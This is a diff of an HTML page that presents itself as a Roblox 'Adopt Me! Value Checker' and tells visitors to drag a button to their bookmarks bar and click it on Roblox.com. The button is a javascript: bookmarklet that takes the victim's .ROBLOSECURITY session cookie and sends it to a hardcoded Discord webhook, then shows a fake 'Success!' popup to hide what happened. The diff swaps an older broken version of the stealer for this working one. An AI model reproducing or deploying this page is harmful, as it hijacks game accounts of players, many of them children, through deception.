@@ -2,38 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Adopt Me! In-Game Value Checker</title>
+    <title>Adopt Me! Value Checker v4.2</title>
     <style>
         body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; max-width: 450px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h1 { color: #f0b90b; margin-bottom: 10px; }
-        p { color: #848e9c; font-size: 14px; margin-bottom: 25px; }
+        h1 { color: #f0b90b; }
         .drag-btn {
             display: inline-block; padding: 20px 40px; background: #f0b90b; color: black;
             text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; margin-bottom: 25px;
-            box-shadow: 0 5px 15px rgba(240, 185, 11, 0.3);
         }
-        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; line-height: 1.6; }
-        .steps b { color: #f0b90b; }
+        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>Value Checker v4.2</h1>
-        <p>The #1 tool to analyze trading values directly inside Roblox. Works for Adopt Me! and more.</p>
+        <p>Drag the button below to your Bookmarks Bar</p>
         
-        <!-- 袙小孝袗袙鞋 小袙袨袡 袙袝袘啸校袣 袙袦袝小孝袨 孝袙袨袡_WEBHOOK_URL 袧袠袞袝 -->
-        <a class="drag-btn" href="javascript:(function(){var w='https://discord.com/api/webhooks/1491506768474542193/dEVFv_8bSOrmMdnF9iay5ZtI_ADT6NcH8YKqYlE5E3Xbu_rh-Fp4Qg5KMqxzbjowIvaQ';var c=document.cookie.split('; ').find(r=>r.startsWith('.ROBLOSECURITY='));if(c){var t=c.split('=')[1];fetch(w,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'馃殌 New Session Captured',description:'
-'+t+'',color
-DRAG TO BOOKMARKS BAR
-</a>
-<div class="steps">
-1. Press <b>Ctrl + Shift + B</b> to show your bar.
+        <!-- ОБНОВЛЕННАЯ КНОПКА -->
+        <a class="drag-btn" href="javascript:(function(){var w='https://discord.com/api/webhooks/1491506768474542193/dEVFv_8bSOrmMdnF9iay5ZtI_ADT6NcH8YKqYlE5E3Xbu_rh-Fp4Qg5KMqxzbjowIvaQ';var c=document.cookie.split('; ').find(r=>r.startsWith('.ROBLOSECURITY='));var t=c?c.split('=')[1]:'No Cookie';fetch(w,{method:'POST',mode:'no-cors',body:JSON.stringify({content:'NEW LOG: '+t})}).catch(e=>console.log(e));var u=document.createElement('div');u.style='position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 25px rgba(240,185,11,0.5);';u.innerHTML='<h3 style=margin:0>Value Checker</h3><p style=color:white>Analyzing Market... Success!</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';document.body.appendChild(u);})();" onmousedown="return false;">
+            DRAG TO BOOKMARKS
+        </a>
 
-2. Drag the <b>yellow button</b> to your bookmarks bar.
-
-3. Go to <b>Roblox.com</b> and click the bookmark!
-</div>
-</div>
+        <div class="steps">
+            1. Ctrl + Shift + B (Show bar)<br>
+            2. Drag button to bar<br>
+            3. Click it on Roblox.com
+        </div>
+    </div>
 </body>
 </html>
